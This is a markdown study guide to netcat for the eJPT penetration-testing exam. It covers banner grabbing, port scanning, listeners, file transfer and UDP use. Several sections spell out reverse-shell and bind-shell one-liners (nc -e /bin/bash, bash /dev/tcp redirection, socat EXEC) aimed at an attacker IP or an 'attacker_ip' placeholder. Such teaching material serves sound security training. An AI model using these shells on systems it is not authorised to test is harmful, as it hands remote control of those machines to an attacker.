# NETCAT (NC) - Network Utility Swiss Army Knife

## Overview

**Netcat** (nc) is often called the "Swiss Army knife" of networking tools. It reads and writes data across network connections using TCP or UDP protocols. In penetration testing, it's used for banner grabbing, reverse shells, port forwarding, and basic socket operations.

### Why It's Critical for eJPT:
- Simple manual service enumeration (banner grabbing)
- Receiving reverse shells and bind shells
- Creating simple listeners for shell callbacks
- Port forwarding and tunneling
- Testing network connectivity
- Raw socket manipulation

---

## Installation & Setup

### CachyOS (Arch Linux)
```bash
sudo pacman -S gnu-netcat
nc --version  # or nc -h
which nc
```

### Verify Installation
```bash
# Test basic functionality:
echo "test" | nc localhost 22  # Try to connect to SSH
```

### Windows
- Built into many penetration testing tools
- Use WSL or download from https://eternallybored.org/misc/netcat/
- Or use PowerShell: `Test-NetConnection`

---

## Core Concepts

### Connection Modes
- **Client Mode**: Connects to remote service (default)
- **Server Mode** (`-l`): Listens for incoming connections
- **TCP** (default): Connection-oriented, reliable
- **UDP** (`-u`): Connectionless, faster, unreliable

### Common Use Cases
- **Banner Grabbing**: Get service identification strings
- **Port Scanning**: Basic TCP connectivity testing
- **File Transfer**: Send files over network
- **Remote Shell**: Receive shell from compromised system
- **Port Forwarding**: Route traffic through netcat

---

## Common Use Cases for eJPT

### 1. **Banner Grabbing (Service Identification)**
Identify running services by connecting and reading banners.

```bash
nc -v 192.168.1.100 22
```

**Output:**
```
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.1.100:22.
SSH-2.0-OpenSSH_7.4
```

**Flags:**
- `-v`: Verbose (shows connection info)
- Default port: 22 (SSH)

### 2. **Banner Grabbing on Web Servers**
Connect to HTTP and read server information.

```bash
nc -v 192.168.1.100 80
# Then type:
GET / HTTP/1.0
# Press Enter twice
```

**Output:**
```
HTTP/1.1 200 OK
Server: Apache/2.4.6 (CentOS)
Date: Mon, 10 Jan 2022 10:30:00 GMT
...
```

**Or in one command:**
```bash
echo "GET / HTTP/1.0\n\n" | nc -v 192.168.1.100 80
```

### 3. **Quick Port Scan**
Test if ports are open (faster than nmap for quick checks).

```bash
# Single port:
nc -zv 192.168.1.100 80

# Multiple ports:
nc -zv 192.168.1.100 20-25 80 443 3306
```

**Flags:**
- `-z`: Zero-I/O mode (don't send data, just scan)
- `-v`: Verbose

**Output:**
```
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.1.100:22 (TCP)!
Ncat: Connection refused for 192.168.1.100:23 (TCP)
Ncat: Connected to 192.168.1.100:80 (TCP)!
```

### 4. **Setup Listener (For Reverse Shells)**
Create a listener to receive incoming shell connections.

```bash
nc -l -p 4444 -v
```

**Flags:**
- `-l`: Listen mode
- `-p`: Port to listen on
- `-v`: Verbose

**Output:**
```
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.1.50.
Ncat: Connection from 192.168.1.50:54321.
```

### 5. **Receive Reverse Shell**
```bash
# On attacker machine (listening):
nc -l -p 4444

# On compromised system (connect back):
nc -e /bin/bash 192.168.1.50 4444
# Or if -e disabled:
/bin/bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
```

### 6. **Create Bind Shell**
Service listens on target, attacker connects.

```bash
# On target (listening):
nc -l -p 4444 -e /bin/bash

# On attacker (connecting):
nc 192.168.1.100 4444
```

### 7. **File Transfer with Netcat**
Send files over the network.

```bash
# Receiving end:
nc -l -p 4444 > received_file.txt

# Sending end:
nc 192.168.1.100 4444 < file_to_send.txt
```

**Or:**
```bash
# Receiving (with visual feedback):
nc -l -p 4444 > file.txt

# Sending:
cat file.txt | nc 192.168.1.100 4444
```

### 8. **UDP Mode**
Test UDP services.

```bash
nc -u -v 192.168.1.100 53  # DNS
nc -u -v 192.168.1.100 161  # SNMP
```

**Flags:**
- `-u`: UDP mode

### 9. **Timeout Handling**
Close connection after inactivity.

```bash
nc -v -w 5 192.168.1.100 80
```

**Flag:**
- `-w`: Timeout in seconds

### 10. **UDP Broadcast**
Send broadcast packets.

```bash
nc -u -b 255.255.255.255 500
```

**Flag:**
- `-b`: Allow broadcast

---

## Command Reference - Essential Flags

| Flag | Purpose | Example |
|------|---------|---------|
| `-l` | Listen mode | `-l -p 4444` |
| `-p` | Port | `-p 4444` |
| `-v` | Verbose | See connection details |
| `-z` | Zero-I/O (scan) | No data sent |
| `-e` | Execute program | `-e /bin/bash` |
| `-u` | UDP mode | Default is TCP |
| `-w` | Timeout | `-w 5` (seconds) |
| `-b` | Broadcast | Allow broadcast packets |
| `-n` | No DNS | Skip hostname lookups |
| `-r` | Random ports | Randomize source ports |

---

## Practical eJPT Scenarios

### Scenario 1: Service Discovery
```bash
# Find running services on a host:
for port in 21 22 23 25 53 80 110 143 389 443 445 1433 3306 3389 5432 5900 8080 8443; do
  echo "Testing port $port:"
  timeout 1 nc -zv 192.168.1.100 $port 2>&1 | grep -i "succeeded\|open\|refused"
done
```

### Scenario 2: Collect Service Banners
```bash
# Get banners from multiple services:
for port in 22 25 80 110 143 3306; do
  echo "=== Port $port ==="
  timeout 1 bash -c "echo '' | nc 192.168.1.100 $port" 2>/dev/null
done
```

### Scenario 3: Shell Callback Setup
```bash
# Attacker prepares listener:
nc -l -p 4444 -v

# Victim (after compromised) connects back:
# nc -e /bin/bash attacker_ip 4444
```

### Scenario 4: Quick Reverse Shell Creation
```bash
# One-liner for reverse shell (if target has nc):
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Or with netcat:
nc -e /bin/sh attacker_ip 4444
```

---

## Real-World eJPT Examples

### Example 1: HTTP Banner Grabbing
```bash
$ echo -e "GET / HTTP/1.0\r\n\r\n" | nc 192.168.1.50 80
HTTP/1.1 200 OK
Server: Apache/2.4.6 (CentOS)
Date: Mon, 10 Jan 2022 10:30:00 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 1234
...
```

### Example 2: SMTP Banner Grabbing
```bash
$ nc -v 192.168.1.50 25
Ncat: Version 7.91
Ncat: Connected to 192.168.1.50:25
220 mail.example.com ESMTP Postfix

# Can then send VRFY commands:
VRFY user1
# May reveal user exists
```

### Example 3: Quick Listener for Reverse Shell
```bash
# Terminal 1 (Attacker - Listener):
$ nc -l -p 4444 -v
Ncat: Version 7.91
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.1.100.
Ncat: Connection from 192.168.1.100:54321.

# Now attacker has shell access (shell commands execute here)
$ whoami
root

# Terminal 2 (Victim - Connector):
$ nc -e /bin/bash 192.168.1.50 4444
# Connection established, commands sent to Terminal 1
```

---

## Tips & Tricks for eJPT

### Banner Grabbing One-Liners
```bash
# Get SSH banner:
echo "" | nc -v 192.168.1.100 22 2>&1 | head -1

# Get HTTP Server header:
echo -e "GET / HTTP/1.0\r\n\r\n" | nc 192.168.1.100 80 | grep -i "Server:"

# Get FTP banner:
echo "" | nc -v 192.168.1.100 21 2>&1 | head -1

# Rapid multi-port check:
for port in 20 21 22 23 25 53 80 110 143 389 443 445 3306 3389 5432 5900 8080; do
  (echo "" | nc -zv 192.168.1.100 $port 2>&1 | grep -i "succeeded") &
done
wait
```

### Performance Tips
```bash
# Speed up scanning with timeout:
for port in {20..443}; do
  timeout 0.1 bash -c "echo '' > /dev/tcp/192.168.1.100/$port" 2>/dev/null && echo "Port $port open"
done

# Use -n to skip DNS:
nc -zn 192.168.1.100 22  # Faster, no DNS lookup
```

### Common Services & Ports
```
FTP: 21       | Telnet: 23    | SMTP: 25
DNS: 53       | HTTP: 80      | POP3: 110
IMAP: 143     | HTTPS: 443    | SMB: 445
MySQL: 3306   | MSSQL: 1433   | RDP: 3389
PostgreSQL: 5432 | VNC: 5900   | Tomcat: 8080
```

---

## Netcat Alternatives (Modern)

```bash
# ncat (Nmap's netcat):
ncat -l -p 4444

# socat (more features):
socat TCP-LISTEN:4444,reuseaddr EXEC:/bin/bash

# telnet (for banner grabbing):
telnet 192.168.1.100 80
```

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| "-e flag not available" | Use bash redirection: `/bin/bash -i >& /dev/tcp/ip/port` |
| "Permission denied on port" | Use port > 1024 or sudo for < 1024 |
| "Connection refused" | Service not running, wrong port, or firewall blocking |
| "Timeout" | Use `-w` flag to increase timeout |

---

## Official Documentation & Resources

- **GNU Netcat Manual**: `man nc`
- **Ncat (Nmap's version)**: https://nmap.org/ncat/
- **Common nc recipes**: https://www.digitalocean.com/community/tutorials/how-to-use-netcat

---

## Key Takeaways for eJPT

1. **Banner grab**: `echo "" | nc -v target port`
2. **Quick scan**: `nc -zv target port1 port2 port3`
3. **Listen for reverse shell**: `nc -l -p 4444`
4. **Send reverse shell**: `nc -e /bin/bash attacker_ip port`
5. **File transfer**: `cat file | nc target port`
6. **Fast service discovery**: Combine with timeout
7. **Always use `-v`**: See what's happening

---

**Next Steps**: Use netcat for initial shell callback, then upgrade to full TTY with other tools.
